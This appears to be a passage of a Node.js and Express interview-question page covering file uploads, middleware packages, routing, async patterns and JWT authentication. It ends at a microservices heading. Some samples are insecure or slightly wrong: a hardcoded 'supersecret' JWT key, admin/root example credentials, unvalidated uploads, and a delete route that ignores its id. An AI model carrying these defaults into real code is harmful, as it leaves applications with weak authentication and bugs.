&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&#39;express&#39;);
var app = express();
var fs = require(&quot;fs&quot;);

var id = 2;

app.delete(&#39;/deleteUser&#39;, function (req, res) {
   // First read existing users.
   fs.readFile( __dirname + &quot;/&quot; + &quot;users.json&quot;, &#39;utf8&#39;, function (err, data) {
      data = JSON.parse( data );
      delete data[&quot;user&quot; + 2];
      console.log( data );
      res.end( JSON.stringify(data));
   });
})

var server = app.listen(3000, function () {
   var host = server.address().address
   var port = server.address().port
   console.log(&quot;App listening at http://%s:%s&quot;, host, port)
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How to handle file upload in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;express&lt;/strong&gt;: Popular web framework built on top of Node.js, used for creating REST-API.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;body-parser&lt;/strong&gt;: Parse incoming request bodies in a middleware&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;multer&lt;/strong&gt;: Middleware for handling multipart/form-data ‚Äî file uploads&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;1. Installing the dependencies&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install express body-parser multer --save
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;2. Package.json&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-json&quot;&gt;{
  &quot;name&quot;: &quot;file_upload&quot;,
  &quot;version&quot;: &quot;0.0.1&quot;,
  &quot;dependencies&quot;: {
    &quot;express&quot;: &quot;4.13.3&quot;,
    &quot;multer&quot;: &quot;1.1.0&quot;
  },
  &quot;devDependencies&quot;: {
    &quot;should&quot;: &quot;~7.1.0&quot;,
    &quot;mocha&quot;: &quot;~2.3.3&quot;,
    &quot;supertest&quot;: &quot;~1.1.0&quot;
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;3. Server.js&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&quot;express&quot;);
var bodyParser = require(&#39;body-parser&#39;);
var multer  = require(&#39;multer&#39;);
var app = express();

// for text/number data transfer between clientg and server
app.use(bodyParser());

var storage =   multer.diskStorage({
  destination: function (req, file, callback) {
    callback(null, &#39;./uploads&#39;);
  },
  filename: function (req, file, callback) {
    callback(null, file.fieldname + &#39;-&#39; + Date.now());
  }
});

var upload = multer({ storage : storage}).single(&#39;userPhoto&#39;);

app.get(&#39;/&#39;, function(req, res) {
      res.sendFile(__dirname + &quot;/index.html&quot;);
});

// POST: upload for single file upload
app.post(&#39;/api/photo&#39;, function(req, res) {
    upload(req,res,function(err) {
        if(err) {
            return res.end(&quot;Error uploading file.&quot;);
        }
        res.end(&quot;File is uploaded&quot;);
    });
});

app.listen(3000, function(){
    console.log(&quot;Listening on port 3000&quot;);
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;4. index.html&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;title&amp;gt;Multer-File-Upload&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;h1&amp;gt;MULTER File Upload | Single File Upload&amp;lt;/h1&amp;gt; 

    &amp;lt;form id = &quot;uploadForm&quot;
         enctype = &quot;multipart/form-data&quot;
         action = &quot;/api/photo&quot;
         method = &quot;post&quot;
    &amp;gt;
      &amp;lt;input type=&quot;file&quot; name=&quot;userPhoto&quot; /&amp;gt;
      &amp;lt;input type=&quot;submit&quot; value=&quot;Upload Image&quot; name=&quot;submit&quot;&amp;gt;
    &amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;Explain the terms body-parser, cookie-parser, morgan, nodemon, pm2, serve-favicon, cors, dotenv, fs-extra, moment in Express JS?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;a) body-parser&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;body-parser&lt;/code&gt; extract the entire body portion of an incoming request stream and exposes it on &lt;code&gt;req.body&lt;/code&gt;. This body-parser module parses the JSON, buffer, string and URL encoded data submitted using HTTP POST request.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install express ejs body-parser
&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// server.js

var express = require(&#39;express&#39;)
var bodyParser = require(&#39;body-parser&#39;)

var app = express()

// create application/json parser
var jsonParser = bodyParser.json()

// create application/x-www-form-urlencoded parser
var urlencodedParser = bodyParser.urlencoded({ extended: false })

// POST /login gets urlencoded bodies
app.post(&#39;/login&#39;, urlencodedParser, function (req, res) {
  res.send(&#39;welcome, &#39; + req.body.username)
})

// POST /api/users gets JSON bodies
app.post(&#39;/api/users&#39;, jsonParser, function (req, res) {
  // create user in req.body
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;b) cookie-parser&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;A cookie is a piece of data that is sent to the client-side with a request and is stored on the client-side itself by the Web Browser the user is currently using.&lt;/p&gt; 
&lt;p&gt;The &lt;code&gt;cookie-parser&lt;/code&gt; middleware&#39;s cookieParser function takes a &lt;code&gt;secret&lt;/code&gt; string or array of strings as the first argument and an &lt;code&gt;options&lt;/code&gt; object as the second argument.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install cookie-parser
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&#39;express&#39;)
var cookieParser = require(&#39;cookie-parser&#39;)

var app = express()
app.use(cookieParser())

app.get(&#39;/&#39;, function (req, res) {
  // Cookies that have not been signed
  console.log(&#39;Cookies: &#39;, req.cookies)

  // Cookies that have been signed
  console.log(&#39;Signed Cookies: &#39;, req.signedCookies)
})

app.listen(3000)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;c) morgan&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;HTTP request logger middleware for node.js.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install morgan
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;: write logs to a file&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&#39;express&#39;)
var fs = require(&#39;fs&#39;)
var morgan = require(&#39;morgan&#39;)
var path = require(&#39;path&#39;)

var app = express()

// create a write stream (in append mode)
var accessLogStream = fs.createWriteStream(path.join(__dirname, &#39;access.log&#39;), { flags: &#39;a&#39; })

// setup the logger
app.use(morgan(&#39;combined&#39;, { stream: accessLogStream }))

app.get(&#39;/&#39;, function (req, res) {
  res.send(&#39;hello, world!&#39;)
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;d) nodemon&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Nodemon is a utility that will monitor for any changes in source and automatically restart your server.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install -g nodemon
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;{
  // ...
  &quot;scripts&quot;: {
    &quot;start&quot;: &quot;nodemon server.js&quot;
  },
  // ...
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;e) pm2&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;P&lt;/strong&gt;(rocess) &lt;strong&gt;M&lt;/strong&gt;(anager) &lt;strong&gt;2&lt;/strong&gt; (pm2) is a production process manager for Node.js applications with a built-in load balancer. It allows to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install pm2 -g
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Start an application&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;pm2 start app.js
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;[&lt;a href=&quot;https://pm2.keymetrics.io/docs/usage/quick-start/&quot;&gt;Read More&lt;/a&gt;]&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;f) serve-favicon&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Node.js middleware for serving a favicon. The &lt;code&gt;serve-favicon&lt;/code&gt; module lets us exclude requests for the favicon in our logger middleware. It also caches the icon in memory to improve performance by reducing disk access. In addition, it provides an &lt;code&gt;ETag&lt;/code&gt; based on the contents of the icon, rather than file system properties.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install serve-favicon
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&#39;express&#39;)
var favicon = require(&#39;serve-favicon&#39;)
var path = require(&#39;path&#39;)

var app = express()
app.use(favicon(path.join(__dirname, &#39;public&#39;, &#39;favicon.ico&#39;)))

// Add your routes here, etc.

app.listen(3000)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;g) cors&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;C&lt;/strong&gt;ross-&lt;strong&gt;O&lt;/strong&gt;rigin &lt;strong&gt;R&lt;/strong&gt;esource &lt;strong&gt;S&lt;/strong&gt;haring (CORS) headers allow apps running in the browser to make requests to servers on different domains (also known as origins). CORS headers are set on the server side - the HTTP server is responsible for indicating that a given HTTP request can be cross-origin. CORS defines a way in which a browser and server can interact and determine whether or not it is safe to allow a cross-origin request.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install cors
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Example: Enable All CORS Requests&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&#39;express&#39;)
var cors = require(&#39;cors&#39;)
var app = express()

app.use(cors())

app.get(&#39;/products/:id&#39;, function (req, res, next) {
  res.json({msg: &#39;This is CORS-enabled for all origins!&#39;})
})

app.listen(8080, function () {
  console.log(&#39;CORS-enabled web server listening on port 80&#39;)
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Example: Enable CORS for a Single Route&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&#39;express&#39;)
var cors = require(&#39;cors&#39;)
var app = express()

app.get(&#39;/products/:id&#39;, cors(), function (req, res, next) {
  res.json({msg: &#39;This is CORS-enabled for a Single Route&#39;})
})

app.listen(8080, function () {
  console.log(&#39;CORS-enabled web server listening on port 80&#39;)
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;h) dotenv&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;When a NodeJs application runs, it injects a global variable called &lt;code&gt;process.env&lt;/code&gt; which contains information about the state of environment in which the application is running. The &lt;code&gt;dotenv&lt;/code&gt; loads environment variables stored in the &lt;code&gt;.env&lt;/code&gt; file into &lt;code&gt;process.env&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install dotenv
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// .env

DB_HOST=localhost
DB_USER=admin
DB_PASS=root
&lt;/code&gt;&lt;/pre&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// config.js

const db = require(&#39;db&#39;)

db.connect({
  host: process.env.DB_HOST,
  username: process.env.DB_USER,
  password: process.env.DB_PASS
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;i) fs-extra&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;fs-extra&lt;/code&gt; contains methods that aren&#39;t included in the vanilla Node.js fs package. Such as recursive &lt;code&gt;mkdir&lt;/code&gt;, &lt;code&gt;copy&lt;/code&gt;, and &lt;code&gt;remove&lt;/code&gt;. It also uses graceful-fs to prevent &lt;code&gt;EMFILE&lt;/code&gt; errors.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install fs-extra
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const fs = require(&#39;fs-extra&#39;)


// Async with callbacks:
fs.copy(&#39;/tmp/myfile&#39;, &#39;/tmp/mynewfile&#39;, err =&amp;gt; {
  if (err) return console.error(err)
  console.log(&#39;success!&#39;)
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;j) moment&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;A JavaScript date library for parsing, validating, manipulating, and formatting dates.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install moment --save
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Usage&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Format Dates&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const moment = require(&#39;moment&#39;);

moment().format(&#39;MMMM Do YYYY, h:mm:ss a&#39;); // October 24th 2020, 3:15:22 pm
moment().format(&#39;dddd&#39;);                    // Saturday
moment().format(&quot;MMM Do YY&quot;);               // Oct 24th 20
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;Relative Time&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const moment = require(&#39;moment&#39;);

moment(&quot;20111031&quot;, &quot;YYYYMMDD&quot;).fromNow(); // 9 years ago
moment(&quot;20120620&quot;, &quot;YYYYMMDD&quot;).fromNow(); // 8 years ago
moment().startOf(&#39;day&#39;).fromNow();        // 15 hours ago
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;Calendar Time&lt;/li&gt; 
&lt;/ul&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;const moment = require(&#39;moment&#39;);

moment().subtract(10, &#39;days&#39;).calendar(); // 10/14/2020
moment().subtract(6, &#39;days&#39;).calendar();  // Last Sunday at 3:18 PM
moment().subtract(3, &#39;days&#39;).calendar();  // Last Wednesday at 3:18 PM
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How does routing work in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;Routing defines the way in which the client requests are handled by the application endpoints. We define routing using methods of the Express app object that correspond to HTTP methods; for example, &lt;code&gt;app.get()&lt;/code&gt; to handle &lt;code&gt;GET&lt;/code&gt; requests and &lt;code&gt;app.post&lt;/code&gt; to handle &lt;code&gt;POST&lt;/code&gt; requests, &lt;code&gt;app.all()&lt;/code&gt; to handle all HTTP methods and &lt;code&gt;app.use()&lt;/code&gt; to specify middleware as the callback function.&lt;/p&gt; 
&lt;p&gt;These routing methods &quot;listens&quot; for requests that match the specified route(s) and method(s), and when it detects a match, it calls the specified callback function.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Syntax&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;app.METHOD(PATH, HANDLER)
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Where:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;app is an instance of express.&lt;/li&gt; 
 &lt;li&gt;METHOD is an &lt;code&gt;HTTP request method&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;PATH is a path on the server.&lt;/li&gt; 
 &lt;li&gt;HANDLER is the function executed when the route is matched.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;a) Route methods&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// GET method route
app.get(&#39;/&#39;, function (req, res) {
  res.send(&#39;GET request&#39;)
})

// POST method route
app.post(&#39;/login&#39;, function (req, res) {
  res.send(&#39;POST request&#39;)
})

// ALL method route
app.all(&#39;/secret&#39;, function (req, res, next) {
  console.log(&#39;Accessing the secret section ...&#39;)
  next() // pass control to the next handler
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;b) Route paths&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Route paths, in combination with a request method, define the endpoints at which requests can be made. Route paths can be strings, string patterns, or regular expressions.&lt;/p&gt; 
&lt;p&gt;The characters &lt;code&gt;?&lt;/code&gt;, &lt;code&gt;+&lt;/code&gt;, &lt;code&gt;*&lt;/code&gt;, and &lt;code&gt;()&lt;/code&gt; are subsets of their regular expression counterparts. The hyphen &lt;code&gt;(-)&lt;/code&gt; and the dot &lt;code&gt;(.)&lt;/code&gt; are interpreted literally by string-based paths.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// This route path will match requests to /about.
app.get(&#39;/about&#39;, function (req, res) {
  res.send(&#39;about&#39;)
})


// This route path will match acd and abcd.
app.get(&#39;/ab?cd&#39;, function (req, res) {
  res.send(&#39;ab?cd&#39;)
})


// This route path will match butterfly and dragonfly
app.get(/.*fly$/, function (req, res) {
  res.send(&#39;/.*fly$/&#39;)
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;c) Route parameters&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Route parameters are named URL segments that are used to capture the values specified at their position in the URL. The captured values are populated in the &lt;code&gt;req.params&lt;/code&gt; object, with the name of the route parameter specified in the path as their respective keys.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example&lt;/em&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;app.get(&#39;/users/:userId&#39;, function (req, res) {
  res.send(req.params)
})
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Response methods&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;| Method | Description | |-------------------|-------------------------------| |&lt;code&gt;res.download()&lt;/code&gt; |Prompt a file to be downloaded.| |&lt;code&gt;res.end()&lt;/code&gt; |End the response process.| |&lt;code&gt;res.json()&lt;/code&gt; |Send a JSON response.| |&lt;code&gt;res.jsonp()&lt;/code&gt; |Send a JSON response with JSONP support.| |&lt;code&gt;res.redirect()&lt;/code&gt; |Redirect a request.| |&lt;code&gt;res.render()&lt;/code&gt; |Render a view template.| |&lt;code&gt;res.send()&lt;/code&gt; |Send a response of various types.| |&lt;code&gt;res.sendFile()&lt;/code&gt; |Send a file as an octet stream.| |&lt;code&gt;res.sendStatus()&lt;/code&gt; |Set the response status code and send its string representation as the response body.|&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;d) Router method&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&#39;express&#39;)
var router = express.Router()

// middleware that is specific to this router
router.use(function timeLog (req, res, next) {
  console.log(&#39;Time: &#39;, Date.now())
  next()
})

// define the home page route
router.get(&#39;/&#39;, function (req, res) {
  res.send(&#39;Birds home page&#39;)
})

// define the about route
router.get(&#39;/about&#39;, function (req, res) {
  res.send(&#39;About birds&#39;)
})

module.exports = router
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How node.js prevents blocking code?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Blocking vs Non-blocking&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Blocking&lt;/strong&gt; is when the execution of additional JavaScript in the Node.js process must wait until a non-JavaScript operation completes. This happens because the event loop is unable to continue running JavaScript while a &lt;strong&gt;blocking&lt;/strong&gt; operation is occurring.&lt;/p&gt; 
&lt;p&gt;Synchronous methods in the Node.js standard library that use &lt;strong&gt;libuv&lt;/strong&gt; are the most commonly used blocking operations. Native modules may also have blocking methods. Blocking methods execute &lt;code&gt;synchronously&lt;/code&gt; and non-blocking methods execute &lt;code&gt;asynchronously&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example:&lt;/em&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// Blocking
const fs = require(&#39;fs&#39;);
const data = fs.readFileSync(&#39;/file.md&#39;); // blocks here until file is read
console.log(data);
moreWork(); // will run after console.log

// Non-blocking
const fs = require(&#39;fs&#39;);
fs.readFile(&#39;/file.md&#39;, (err, data) =&amp;gt; {
  if (err) throw err;
  console.log(data);
});
moreWork(); // will run before console.log
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;What is difference between promises and async-await in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;1. Promises&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;A promise is used to handle the asynchronous result of an operation. JavaScript is designed to not wait for an asynchronous block of code to completely execute before other synchronous parts of the code can run. With Promises, we can defer the execution of a code block until an async request is completed. This way, other operations can keep running without interruption.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;States of Promises:&lt;/strong&gt;&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;Pending&lt;/code&gt;: Initial State, before the Promise succeeds or fails.&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;Resolved&lt;/code&gt;: Completed Promise&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;Rejected&lt;/code&gt;: Failed Promise, throw an error&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;em&gt;Example:&lt;/em&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;function logFetch(url) {
  return fetch(url)
    .then(response =&amp;gt; {
      console.log(response);
    })
    .catch(err =&amp;gt; {
      console.error(&#39;fetch failed&#39;, err);
    });
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;2. Async-Await&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;Await&lt;/code&gt; is basically syntactic sugar for &lt;strong&gt;Promises&lt;/strong&gt;. It makes asynchronous code look more like synchronous/procedural code, which is easier for humans to understand.&lt;/p&gt; 
&lt;p&gt;Putting the keyword &lt;code&gt;async&lt;/code&gt; before a function tells the function to return a Promise. If the code returns something that is not a &lt;code&gt;Promise&lt;/code&gt;, then JavaScript automatically wraps it into a resolved promise with that value. The &lt;code&gt;await&lt;/code&gt; keyword simply makes JavaScript wait until that &lt;code&gt;Promise&lt;/code&gt; settles and then returns its result.&lt;/p&gt; 
&lt;p&gt;&lt;em&gt;Example:&lt;/em&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;async function logFetch(url) {
  try {
    const response = await fetch(url);
    console.log(response);
  }
  catch (err) {
    console.log(&#39;fetch failed&#39;, err);
  }
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h4&gt;72Q. &lt;em&gt;&lt;strong&gt;How to use JSON Web Token (JWT) for authentication in Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h4&gt; 
&lt;p&gt;JSON Web Token (JWT) is an open standard that defines a compact and self-contained way of securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed.&lt;/p&gt; 
&lt;p&gt;There are some advantages of using JWT for authorization:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Purely stateless. No additional server or infra required to store session information.&lt;/li&gt; 
 &lt;li&gt;It can be easily shared among services.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;JSON Web Tokens consist of three parts separated by dots (.), which are:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;jwt.sign(payload, secretOrPrivateKey, [options, callback])
&lt;/code&gt;&lt;/pre&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Header&lt;/strong&gt; - Consists of two parts: the type of token (i.e., JWT) and the signing algorithm (i.e., HS512)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Payload&lt;/strong&gt; - Contains the claims that provide information about a user who has been authenticated along with other information such as token expiration time.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Signature&lt;/strong&gt; - Final part of a token that wraps in the encoded header and payload, along with the algorithm and a secret&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;Installation&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;npm install jsonwebtoken bcryptjs --save
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Example&lt;/strong&gt;: AuthController.js&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;var express = require(&#39;express&#39;);
var router = express.Router();
var bodyParser = require(&#39;body-parser&#39;);
var User = require(&#39;../user/User&#39;);

var jwt = require(&#39;jsonwebtoken&#39;);
var bcrypt = require(&#39;bcryptjs&#39;);
var config = require(&#39;../config&#39;);


router.use(bodyParser.urlencoded({ extended: false }));
router.use(bodyParser.json());

router.post(&#39;/register&#39;, function(req, res) {
  
  var hashedPassword = bcrypt.hashSync(req.body.password, 8);
  
  User.create({
    name : req.body.name,
    email : req.body.email,
    password : hashedPassword
  },
  function (err, user) {
    if (err) return res.status(500).send(&quot;There was a problem registering the user.&quot;)
    // create a token
    var token = jwt.sign({ id: user._id }, config.secret, {
      expiresIn: 86400 // expires in 24 hours
    });
    res.status(200).send({ auth: true, token: token });
  });
});
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;config.js&lt;/strong&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;// config.js
module.exports = {
  &#39;secret&#39;: &#39;supersecret&#39;
};
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;The &lt;code&gt;jwt.sign()&lt;/code&gt; method takes a payload and the secret key defined in &lt;code&gt;config.js&lt;/code&gt; as parameters. It creates a unique string of characters representing the payload. In our case, the payload is an object containing only the id of the user.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;[&lt;a href=&quot;https://www.npmjs.com/package/jsonwebtoken&quot;&gt;Reference&lt;/a&gt;]&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;!-- raw HTML omitted --&gt; 
&lt;h2&gt;Q. &lt;em&gt;&lt;strong&gt;How to build a microservices architecture with Node.js?&lt;/strong&gt;&lt;/em&gt;&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;Microservices&lt;/strong&gt;&lt;/p&gt; 
